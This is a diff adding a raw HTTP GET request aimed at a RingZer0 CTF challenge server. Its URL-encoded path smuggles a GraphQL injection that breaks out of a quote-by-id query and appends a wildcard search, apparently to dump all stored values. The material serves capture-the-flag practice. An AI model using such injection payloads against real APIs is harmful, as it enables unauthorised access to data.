@@ -1,0 +1,9 @@
+GET /api/quotes/2%29%20%7B%20id%20%7D%20search%20%28query%3A%20%22*%22%29%20%7B%20id%2Cvalue%20%7D%20test%20%3A%20quote%28id%3A1 HTTP/1.1
+Host: challenges.ringzer0ctf.com:10303
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+Accept: */*
+Referer: http://challenges.ringzer0ctf.com:10303/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+If-None-Match: W/"6551184a57e1e95ba11e5a8840762ebe"
+Connection: close
